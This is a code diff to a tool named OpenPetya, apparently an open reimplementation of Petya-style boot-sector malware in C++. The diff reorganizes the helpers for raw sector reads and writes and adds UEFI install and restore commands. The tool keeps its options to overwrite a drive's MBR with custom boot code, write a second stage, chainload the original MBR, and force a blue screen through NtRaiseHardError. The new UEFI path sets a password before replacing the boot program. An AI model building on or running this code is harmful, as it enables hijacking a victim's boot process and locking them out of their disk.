@@ -35,20 +35,11 @@ What is CAN'T do:
 #include <cstring>
 #include <tchar.h>
 
+#include "petya.h"
+#include "utils.h"
+#include "uefi.h"
+
 #pragma comment(lib, "setupapi.lib")
-
-#define SECTOR_SIZE 512
-#define MBR_BOOT_CODE_SIZE 446
-#define MBR_FULL_SIZE 512
-#define STAGE2_START_SECTOR 1
-#define BACKUP_MBR_SECTOR 63
-
-enum enWindowsVersion
-{
-    Windows7,
-    Windows8,
-    Windows10,
-};
 
 // Define prototype of NtRaiseHardError
 typedef NTSTATUS (NTAPI* NtRaiseHardError_t)(
@@ -74,176 +65,6 @@ struct stDriveInfo
     UINT64 uSizeBytes;
     std::wstring szModel;
     std::wstring szPath;
-};
-
-/// @brief Hexdump
-/// @param abBuffer 
-/// @param nLength 
-/// @param nOffset 
-/// @return 
-ULONG fnHexdump(const uint8_t* abBuffer, size_t nLength, size_t nOffset = 0)
-{
-    ULONG nResult = 0;
-    for (ULONG i = 0; i < nLength; i += 16)
-    {
-        printf("%08X |", i);
-
-        nResult += 16;
-        for (ULONG j = 0; j < 16; j++)
-        {
-            if (i + j < nLength)
-            {
-                nResult += printf(" %02X", abBuffer[i + j]);
-            }
-            else
-            {
-                nResult += printf(" 00");
-            }
-        }
-
-        nResult += printf(" | ");
-        for (ULONG j = 0; j < 16; j++)
-        {
-            if (i + j < nLength)
-            {
-                UCHAR k = abBuffer[i + j];
-                UCHAR c = k < 32 || k > 127 ? '.' : k;
-                nResult += printf("%c", c);
-            }
-            else
-            {
-                nResult += printf(" ");
-            }
-        }
-
-        nResult += printf("\n");
-    }
-
-    return nResult;
-}
-
-/// @brief 
-/// @param nMajor 
-/// @param nMinor 
-/// @return 
-DWORD fnGetWindowsVersion(int nMajor, int nMinor)
-{
-    if (nMajor == 10)
-    {
-        return enWindowsVersion::Windows10;
-    }
-    else if (nMajor == 6)
-    {
-        if (nMinor == 3 || nMinor == 2)
-        {
-            return enWindowsVersion::Windows8;
-        }
-        else if (nMinor == 1)
-        {
-            return enWindowsVersion::Windows7;
-        }
-    }
-
-    return -1;
-}
-
-/// @brief Disk handling class
-class clsDiskHandle
-{
-public:
-    HANDLE m_hFile = INVALID_HANDLE_VALUE;
-
-    clsDiskHandle() = default;
-
-    ~clsDiskHandle()
-    {
-        if (INVALID_HANDLE_VALUE != m_hFile)
-            CloseHandle(m_hFile);
-    }
-
-    /// @brief Open file
-    /// @param szPath Destination path
-    /// @param bWriteAccess Enable Read and Write
-    /// @return 
-    bool fnbOpen(const std::wstring& szPath, bool bWriteAccess)
-    {
-        DWORD dwAccess = bWriteAccess ? GENERIC_READ | GENERIC_WRITE : GENERIC_READ;
-        m_hFile = CreateFileW(
-            szPath.c_str(),
-            dwAccess,
-            FILE_SHARE_READ | FILE_SHARE_WRITE,
-            nullptr,
-            OPEN_EXISTING,
-            FILE_FLAG_WRITE_THROUGH,
-            nullptr
-        );
-
-        if (INVALID_HANDLE_VALUE == m_hFile)
-        {
-            DWORD hError = GetLastError();
-            std::wcerr << L"Failed to open " << szPath << L" (error " << hError << L")\n";
-
-            if (ERROR_ACCESS_DENIED == hError)
-                std::cerr << " Please Run as Administrator\n";
-
-            return false;
-        }
-
-        return true;
-    }
-
-    /// @brief Read specified sector
-    /// @param nLBA 
-    /// @param nCount 
-    /// @param abBuffer 
-    /// @return 
-    bool fnbReadSectors(LONGLONG nLBA, DWORD nCount, std::vector<uint8_t>& abBuffer)
-    {
-        LARGE_INTEGER nOffset;
-        nOffset.QuadPart = nLBA * SECTOR_SIZE;
-
-        if (!SetFilePointerEx(m_hFile, nOffset, nullptr, FILE_BEGIN))
-        {
-            std::cerr << "Seek failed (error: " << GetLastError() << ")\n";
-            return false;
-        }
-
-        abBuffer.resize((size_t)(nCount * SECTOR_SIZE));
-        DWORD nRead = 0;
-        if (!ReadFile(m_hFile, abBuffer.data(), (DWORD)abBuffer.size(), &nRead, nullptr) || nRead != abBuffer.size())
-        {
-            std::wcerr << "Read failed (error: " << GetLastError() << ")\n";
-            return false;
-        }
-
-        return true;
-    }
-
-    /// @brief 
-    /// @param nLBA 
-    /// @param abBuffer 
-    /// @return 
-    bool fnbWriteSectors(LONGLONG nLBA, const std::vector<uint8_t>& abBuffer)
-    {
-        LARGE_INTEGER nOffset;
-        nOffset.QuadPart = nLBA * SECTOR_SIZE;
-
-        if (!SetFilePointerEx(m_hFile, nOffset, nullptr, FILE_BEGIN))
-        {
-            std::wcerr << "Seek failed (error " << GetLastError() << ")\n";
-            return false;
-        }
-
-        DWORD written = 0;
-        if (!WriteFile(m_hFile, abBuffer.data(), (DWORD)abBuffer.size(), &written, nullptr) || written != abBuffer.size())
-        {
-            std::wcerr << "Write failed (error " << GetLastError() << ")\n";
-            return false;
-        }
-
-        FlushFileBuffers(m_hFile);
-        return true;
-    }
 };
 
 /// @brief 
@@ -870,16 +691,24 @@ void fnPrintUsage(const char* szProg)
 
     std::wcout  << "\nUsage: " << szProg << " [options]\n\n"
                 << "Options:\n"
-                << "\t--list                            List physical drives\n"
-                << "\t--drive N                         Select PhysicalDriveN\n"
+                << "Legacy BIOS:\n"
                 << "\t--install <mbr.bin> <stage.bin>   Full installation\n"
                 << "\t--backup-mbr <file>               Backup MBR to specified output file\n"
                 << "\t--save-chainload                  Save MBR to sector 63\n"
                 << "\t--write-mbr                       Write MBR boot code\n"
                 << "\t--write-stage2                    Write Stage2\n"
                 << "\t--restore-mbr                     Restore original MBR\n"
+                
+                << "\nUEFI:\n"
+                << "\t--uefi-install                    Install custom UEFI program\n"
+                << "\t--uefi-restore                    Restore original UEFI program\n"
+
+                << "\nTools:\n"
                 << "\t--validate                        Show disk state\n"
                 << "\t--bsod                            Raise BSOD via NtRaiseHardError()"
+                << "\t--list                            List physical drives\n"
+                << "\t--drive N                         Select PhysicalDriveN\n"
+
                 << "\nExamples:\n"
                 << "\tOpenPetya.exe --list\n"
                 << "\tOpenPetya.exe --drive 1 --backup-mbr\n"
@@ -898,6 +727,8 @@ int _tmain(int argc, char *argv[])
 
     int nIdxDrive = -1;
     bool bList = false;
+
+    // Legacy
     bool bBackup = false;
     bool bChainload = false;
     bool bWriteMBR = false;
@@ -905,6 +736,11 @@ int _tmain(int argc, char *argv[])
     bool bRestore = false;
     bool bValidate = false;
     bool bInstall = false;
+
+    // UEFI
+    bool bUefiInstall = false;
+    bool bUefiRestore = false;
+    std::wstring szMyEfiPath;
 
     std::string szBackupPath;
     std::string szMbrPath;
@@ -1012,6 +848,16 @@ int _tmain(int argc, char *argv[])
             status = NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, nullptr, 6, &response);
 
             std::cout << "Status: " << std::hex << status << std::endl;
+        }
+        else if (arg == "--uefi-install" && i + 1 < argc)
+        {
+            bUefiInstall = true;
+            std::string s = argv[++i];
+            szMyEfiPath = std::wstring(s.begin(), s.end());
+        }
+        else if (arg == "--uefi-restore")
+        {
+            bUefiRestore = true;
         }
         else
         {
@@ -1152,6 +998,40 @@ int _tmain(int argc, char *argv[])
 
         return (int)bRet;
     }
+
+    if (bUefiInstall)
+    {
+        UINT64 nTotalSectors = fnGetDiskTotalSectors(szDrivePath);
+        if (!nTotalSectors)
+        {
+            fprintf(stderr, "[-] Cannot get disk size!\n");
+            return 1;
+        }
+
+        std::string szPassword1, szPassword2;
+        while (true)
+        {
+            szPassword1 = fnInputPassword("Set password: ");
+            szPassword2 = fnInputPassword("Confirm: ");
+
+            if (!szPassword1.empty() && szPassword1 == szPassword2)
+                break;
+
+            fprintf(stderr, "[!] " + szPassword1.empty() ? "Empty!\n" : "Mismatch!\n");
+        }
+
+        bool bResult = fnbInstallUEFI(szMyEfiPath, szPassword1, szDrivePath, nTotalSectors);
+
+        for (char &c : szPassword1)
+            c = 0;
+        for (char &c : szPassword2)
+            c = 0;
+
+        return bResult ? 0 : 1;
+    }
+
+    if (bUefiRestore)
+        return fnbRestoreUEFI() ? 0 : 1;
 
     // Individual operations
     if (bBackup)
